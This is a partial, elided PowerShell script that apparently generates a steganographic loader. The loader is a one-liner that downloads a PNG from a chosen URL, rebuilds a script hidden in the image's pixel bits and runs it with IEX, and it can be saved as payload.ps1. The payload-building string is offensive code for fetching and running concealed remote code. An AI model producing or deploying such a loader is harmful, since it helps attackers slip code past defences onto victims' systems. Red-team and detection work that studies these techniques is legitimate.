...
Specify URL for web parameter
http://localhost/$out is now set as default value

.PARAMETER PAYLOAD

Use this parameter to export the One-liner as payload.ps1 on the current folder
...
#>
    ...
    [CmdletBinding()] Param (
        ...
        [Parameter()]
        [string]$URL="http://localhost/$out"
    )
    #Read-host for URL of hosting .PNG payload
    DynamicParam {
        If ($Web) { 
                ...
                if ($URL | ?{$_ -like "http://*"}) {               
                    ...
                    Write-Warning "You do not have specify correct URL - Set on 'http://localhost'"          
                }
    ...
    End{
        if($web) {
            $pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g= a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$URL`"));`$o= a Byte[] $array;(0..$lrows)|% {foreach(`$x in (0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B -band 15)*16) -bor (`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        }
        else {
        ...
        if($OutPayload) {
            return $pscmd | Out-File .\payload.ps1
        }
        return $pscmd
